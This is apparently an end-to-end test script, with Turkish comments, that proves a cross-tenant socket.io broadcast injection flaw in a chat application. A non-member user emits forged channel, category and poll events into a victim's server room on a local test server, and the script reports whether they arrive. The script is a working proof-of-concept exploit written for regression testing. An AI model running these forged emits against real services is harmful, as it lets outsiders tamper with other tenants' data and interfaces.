// e2e/_relay-spoof.cjs
//
// ÇAPRAZ KİRACI YAYIN ENJEKSİYONU — CANLI SÖMÜRÜ KANITI
//
// `socket/handlers/infra.ts` içinde bir grup olay, istemciden gelen veriyi
// DOĞRUDAN yeniden yayınlıyordu:
//
//     socket.on('channel:deleted', ({ serverId, channelId }) =>
//       io.to(`server:${serverId}`).emit('channel:deleted', { channelId }));
//
// Yetki denetimi YOK, üyelik denetimi YOK, şema doğrulaması YOK ve hem
// `serverId` hem içerik TAMAMEN saldırgan kontrolünde.
//
// Bu betik saldırıyı GERÇEK sunucuya karşı çalıştırır:
//   • kurban, kendi sunucusunun odasında dinler
//   • saldırgan (o sunucunun ÜYESİ DEĞİL) sahte olayı yayar
//   • kurbanın olayı alıp almadığı ölçülür

const fs = require('fs');
const io = require('socket.io-client');

const T = JSON.parse(fs.readFileSync(__dirname + '/fixtures/tokens.json', 'utf8'));
const A = 'http://127.0.0.1:3000';
const UA = 'Mozilla/5.0 Chrome/120';
const sleep = ms => new Promise(r => setTimeout(r, ms));

async function hdr(tok) {
  const H = { Authorization: 'Bearer ' + tok, Accept: 'application/json', 'User-Agent': UA };
  const c = (await (await fetch(A + '/api/csrf-token', { headers: H })).json()).token || '';
  return { ...H, 'Content-Type': 'application/json', 'X-CSRF-Token': c };
}

function connect(tok) {
  return new Promise(res => {
    const s = io(A, { auth: { token: tok }, transports: ['websocket'], reconnection: false, timeout: 15000 });
    const t = setTimeout(() => res(null), 16000);
    s.once('userAuthenticated', () => { clearTimeout(t); res(s); });
    s.on('connect_error', () => { clearTimeout(t); res(null); });
  });
}

(async () => {
  // ── Kurban kendi sunucusunu kurar. Saldirgan UYE DEGILDIR. ──────────────
  const VH = await hdr(T.alice);
  const srv = await (await fetch(A + '/api/servers', {
    method: 'POST', headers: VH, body: JSON.stringify({ name: 'Victim ' + Date.now() }),
  })).json();
  const sid = srv._id || srv.id;

  const ch = await (await fetch(A + '/api/servers/' + sid + '/channels', {
    method: 'POST', headers: VH, body: JSON.stringify({ name: 'genel', type: 'text' }),
  })).json();
  const cid = ch._id || ch.id;

  const victim = await connect(T.alice);
  const attacker = await connect(T.bob);        // bob bu sunucunun UYESI DEGIL
  if (!victim || !attacker) { console.log('baglanti kurulamadi'); process.exit(2); }

  await sleep(1500);   // kurban sunucu odasina yerlessin

  const received = [];
  for (const ev of ['channel:deleted', 'channel:created', 'channel:updated',
                    'category:created', 'category:deleted', 'poll:created']) {
    victim.on(ev, data => received.push({ ev, data }));
  }

  // ── SALDIRI ────────────────────────────────────────────────────────────
  attacker.emit('channel:deleted', { serverId: sid, channelId: cid });
  attacker.emit('channel:created', { serverId: sid, channel: { _id: 'fake-1', name: 'SAHTE KANAL', type: 'text' } });
  attacker.emit('channel:updated', { serverId: sid, channel: { _id: cid, name: 'ELE GECIRILDI' } });
  attacker.emit('category:created', { serverId: sid, category: { _id: 'fake-cat', name: 'SAHTE KATEGORI' } });
  attacker.emit('category:deleted', { serverId: sid, categoryId: 'any' });
  attacker.emit('poll:created', { channelId: cid, poll: { _id: 'fake-poll', question: 'SAHTE ANKET' } });

  await sleep(2500);

  victim.close(); attacker.close();

  console.log('kurban sunucusu :', sid);
  console.log('saldirgan uye mi: HAYIR');
  console.log('alinan sahte olay sayisi:', received.length);
  for (const r of received) {
    console.log('   <= ' + r.ev + '  ' + JSON.stringify(r.data).slice(0, 90));
  }

  console.log('\n── SONUC ──');
  if (received.length > 0) {
    console.log('ACIK: uye OLMAYAN bir kullanici, kurban sunucusunun arayuz durumunu degistirebiliyor.');
    process.exit(1);
  }
  console.log('KAPALI: sahte yayinlarin hicbiri kurbana ulasmadi.');
  process.exit(0);
})().catch(e => { console.error('HATA', e.message); process.exit(2); });
